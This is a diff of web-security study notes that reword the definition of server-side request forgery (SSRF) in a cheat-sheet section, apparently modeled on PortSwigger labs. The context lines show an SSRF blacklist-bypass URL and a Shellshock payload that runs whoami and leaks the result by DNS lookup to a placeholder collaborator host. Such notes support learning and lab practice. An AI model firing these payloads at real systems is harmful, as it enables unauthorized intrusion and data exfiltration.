@@ -357,11 +357,10 @@ def handleResponse(req, interesting):
 
 ## SSRF
 
-[SSRF](../webapp/ServerSideAttacks#ssrf) (**Server-Side Request Forgery**)是一种 Web 安全漏洞，攻击者可以诱导服务端应用向攻击者指定的目标发起请求。本质上是"借服务器的手"去访问它本不该访问、或攻击者自己无法直接访问的资源。
-
-[portswigger-ssrf](https://portswigger.net/web-security/ssrf)
 
 **黑名单过滤绕过**
+
+[SSRF](https://portswigger.net/web-security/ssrf) ([Server-side request forgery](../vuln/SSRF.md)) is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location.
 
 - `127.0.0.1` ⬇️
 ```txt
@@ -394,6 +393,8 @@ localhost:80%2523@stock.weliketoshop.net/admin
 ```bash
 () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
 ```
+
+---
 
 ## XXE injection
 
